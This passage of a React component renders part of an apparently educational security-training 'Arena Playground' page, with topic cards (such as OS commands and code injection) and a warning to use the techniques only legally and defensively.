              topics: ['OS Commands', 'Code Injection', 'RCE', 'Mitigation'],
              gradient: 'from-green-500 to-emerald-500'
            }
          ].map((item, index) => {
            const Icon = item.icon;
            return (
              <motion.div
                key={index}
                variants={staggerItem}
                className="relative rounded-sm p-6 border border-white/10 bg-[#0f172a] hover:bg-[#0B1120] transition-all group hover:border-red-500/30"
              >
                {/* Top red line */}
                <div className={`absolute top-0 left-0 right-0 h-1 bg-red-600 rounded-t-sm`} />

                <div className={`p-3 rounded-sm border border-red-500/20 bg-[#0B1120] w-fit mb-4`}>
                  <Icon className="w-6 h-6 text-white" />
                </div>
                <h3 className="text-xl font-bold text-white mb-2">{item.title}</h3>
                <p className="text-gray-500 text-sm mb-4 leading-relaxed">{item.description}</p>
                <ul className="space-y-2">
                  {item.topics.map((topic, i) => (
                    <li key={i} className="flex items-center gap-2 text-sm text-gray-500">
                      <CheckCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
                      {topic}
                    </li>
                  ))}
                </ul>
              </motion.div>
            );
          })}
        </motion.div>
      </div>

      {/* Safety Notice */}
      <div className="border-t border-white/5 bg-white/[0.01] py-16">
        <div className="container-custom">
          <div className="max-w-4xl mx-auto">
            <div className="relative rounded-sm p-8 border border-red-500/20 bg-[#0B1120]">
              <div className="absolute top-0 left-0 w-full h-1 bg-red-600 rounded-t-sm" />

              <div className="flex items-start gap-4">
                <div className="p-3 rounded-sm bg-[#0f172a] border border-red-500/20 flex-shrink-0">
                  <AlertTriangle className="w-6 h-6 text-red-500" />
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold text-white mb-3">⚠️ Important Warning</h3>
                  <p className="text-gray-300 mb-4 leading-relaxed">
                    This Arena Playground is specifically designed for <strong className="text-white">educational and training purposes</strong>.
                    All activities are conducted in a safe simulated environment.
                  </p>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="flex items-start gap-2">
                      <XCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-red-400">DO NOT</strong> use these techniques on systems without permission
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <XCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-red-400">DO NOT</strong> attack production systems
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-emerald-400">USE</strong> this knowledge for defensive security
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-emerald-400">FOLLOW</strong> laws and responsible hacking ethics
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Auth Modal */}
      <AuthModal
        isOpen={showAuthModal}
        onClose={() => setShowAuthModal(false)}
      />
    </div>
  );
}
